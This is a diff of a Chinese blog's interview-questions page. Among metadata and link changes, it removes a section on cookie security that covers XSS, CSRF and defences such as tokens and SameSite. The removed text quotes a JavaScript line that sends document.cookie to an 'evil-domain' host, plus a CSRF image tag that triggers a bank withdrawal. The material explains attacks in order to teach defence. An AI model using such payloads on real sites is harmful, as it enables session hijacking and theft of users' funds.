@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="面试题（六）, -Breeze&#39;s Blog">
-    <meta name="description" content="漫漫长路，伴你同行">
+    <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -112,7 +112,7 @@
         <div class="logo-name">-Breeze&#39;s Blog</div>
         <div class="logo-desc">
             
-            漫漫长路，伴你同行
+            Never really desperate, only the lost of the soul.
             
         </div>
     </div>
@@ -330,21 +330,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-02-04
+                    2021-03-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.1k
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 Min
+                    6 Min
                 </div>
                 
 
@@ -417,41 +417,11 @@
 <li>Session是保存在服务端，会消耗服务器资源</li>
 <li>Session实现有两种方式：Cookie和URL重写</li>
 </ol>
-<h3 id="Cookie带来的安全性问题"><a href="#Cookie带来的安全性问题" class="headerlink" title="Cookie带来的安全性问题"></a>Cookie带来的安全性问题</h3><ol>
-<li><strong>会话劫持和XSS</strong>：在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。<code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</code>HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。</li>
-<li><p><strong>跨站请求伪造（CSRF）</strong>：维基百科已经给了一个比较好的CSRF例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<code>&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</code>当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。<strong>解决CSRF的办法有：隐藏域验证码、确认机制、较短的Cookie生命周期等</strong></p>
-<h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3></li>
-</ol>
-<p><strong>（1）验证 HTTP Referer 字段</strong> </p>
-<p> 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。 </p>
-<p>如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值 。</p>
-<p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的 ，目前已经有一些方法可以篡改 Referer 值 。</p>
-<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 </p>
-<p><strong>（2）在请求地址中添加 token 并验证</strong> </p>
-<p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 </p>
-<p>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。 在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的。</p>
-<p><strong>（3）SameSite Cookie</strong></p>
-<p>Set-Cookie 响应头新增 SameSite 属性，它用来标明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。SameSite 有两个属性值，分别是 Strict 和 Lax</p>
-<p> <code>Strict</code>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。 </p>
-<p><code>Lax</code>规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。 </p>
-<h3 id="goole浏览器中对cookie的设置"><a href="#goole浏览器中对cookie的设置" class="headerlink" title="goole浏览器中对cookie的设置"></a>goole浏览器中对cookie的设置</h3><h4 id="SameSite-by-default-cookies"><a href="#SameSite-by-default-cookies" class="headerlink" title="SameSite by default cookies"></a>SameSite by default cookies</h4><blockquote>
-<p>Treat cookies that don’t specify a SameSite attribute as if they were SameSite=Lax. Sites must specify SameSite=None in order to enable third-party usage. – Mac, Windows, Linux, Chrome OS, Android</p>
-<p>将未指定SameSite属性的cookie视为SameSite=Lax(默认),网站必须指定SameSite=None才能启用第三方cookie。<br>把这个设置关了就允许所有的第三方cookie</p>
-</blockquote>
-<h4 id="Cookies-without-SameSite-must-be-secure"><a href="#Cookies-without-SameSite-must-be-secure" class="headerlink" title="Cookies without SameSite must be secure"></a>Cookies without SameSite must be secure</h4><blockquote>
-<p>If enabled, cookies without SameSite restrictions must also be Secure. If a cookie without SameSite restrictions is set without the Secure attribute, it will be rejected. This flag only has an effect if “SameSite by default cookies” is also enabled. – Mac, Windows, Linux, Chrome OS, Android</p>
-<p>如果启用，没有SameSite限制的cookie也必须是安全的。如果没有设置SameSite限制的cookie没有Secure属性，它将被拒绝。此标志仅在启用’sameSite by default cookies’时有效。</p>
-</blockquote>
-<p>如果你想加 SameSite=none 属性，那么该 Cookie 就必须同时加上 Secure 属性，表示只有在 HTTPS 协议下该 Cookie 才会被发送。 </p>
-<p>SameSite 可以有下面三种值：</p>
-<blockquote>
-<ol>
-<li>Strict 仅允许一方请求携带 Cookie，即浏览器将只发送相同站点请求的 Cookie，即当前网页 URL 与请求目标 URL 完全一致。</li>
-<li>Lax 允许部分第三方请求携带 Cookie</li>
-<li>None 无论是否跨站都会发送 Cookie</li>
-</ol>
-</blockquote>
-<p>之前默认是 None 的，Chrome80 后默认是 Lax</p>
+<h3 id="Cookie带来的安全性问题"><a href="#Cookie带来的安全性问题" class="headerlink" title="Cookie带来的安全性问题"></a>Cookie带来的安全性问题</h3><ul>
+<li>CSRF</li>
+<li><p>XSS</p>
+<h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a><a href="https://jinjingxuan.github.io/2020/12/18/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%80%E4%BB%8B/#toc-heading-8" target="_blank" rel="noopener">如何防御</a></h3></li>
+</ul>
 <h2 id="html5的标签"><a href="#html5的标签" class="headerlink" title="html5的标签"></a>html5的标签</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>:定义区段或页面的页脚.(足部)
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span>:定义文档中的区段.
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>article</span><span class="token punctuation">></span></span>:定义文章.
@@ -934,13 +904,13 @@ console<span class="token punctuation">.</span><span class="token function">log<
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2018/08/03/面试-面试题（八）/">
+                <a href="/2018/08/03/面试-面试题（二）/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="面试题（八）">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="面试题（二）">
                         
-                        <span class="card-title">面试题（八）</span>
+                        <span class="card-title">面试题（二）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -975,13 +945,13 @@ console<span class="token punctuation">.</span><span class="token function">log<
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2018/08/03/面试-面试题（十）/">
+                <a href="/2018/08/03/面试-面试题（十一）/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="面试题（十）">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="面试题（十一）">
                         
-                        <span class="card-title">面试题（十）</span>
+                        <span class="card-title">面试题（十一）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1201,7 +1171,7 @@ console<span class="token punctuation">.</span><span class="token function">log<
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">173k</span>&nbsp;字
+                class="white-color">177k</span>&nbsp;字
             
             
             
